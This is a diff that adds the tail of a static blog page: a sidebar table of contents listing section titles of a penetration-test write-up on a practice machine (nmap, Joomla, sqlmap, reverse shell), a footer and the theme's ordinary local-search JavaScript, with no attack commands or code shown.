+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">1.</span> <span class="nav-text">靶机地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NMAP%E6%89%AB%E6%8F%8F%E5%BE%97%E5%88%B0ip%E5%9C%B0%E5%9D%80"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP扫描得到ip地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9Joomla%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.</span> <span class="nav-text">针对Joomla的攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-%E6%B3%A8%E5%85%A5sql"><span class="nav-number">2.3.</span> <span class="nav-text">sqlmap 注入sql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.4.</span> <span class="nav-text">反弹shell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">stdout</span>
+
+  
+</div>
+-->
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
